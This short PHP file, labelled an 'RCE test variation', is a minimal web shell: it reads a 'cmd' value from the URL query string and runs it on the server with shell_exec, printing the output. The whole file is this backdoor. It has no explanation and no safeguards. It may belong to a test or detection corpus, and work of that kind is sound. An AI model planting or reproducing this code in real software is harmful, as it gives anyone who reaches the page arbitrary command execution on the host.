<?php
// RCE test variation #376
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>